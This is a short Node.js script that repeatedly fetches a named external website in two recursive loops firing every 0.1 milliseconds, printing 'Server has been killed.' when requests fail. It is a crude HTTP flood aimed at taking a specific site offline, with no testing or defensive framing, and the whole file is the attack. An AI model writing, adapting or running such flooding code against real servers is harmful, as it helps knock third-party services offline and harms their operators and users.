import fetch  from "node-fetch";
import {exec} from "child_process";

let req_id = 0;
function run () {
    req_id = req_id +1;
    fetch("https://www.mussolinibenito.net/")
    .then(()=>{
        console.log(`Sending request id (${req_id})`)
    })
    .catch((err)=>{
    console.error(`Server has been killed.`)
    })
    setTimeout(() => {
        run()
    }, 0.1);
}

let counter = 0;
do {
    run()
    counter = counter +1;
} while (counter<=1)
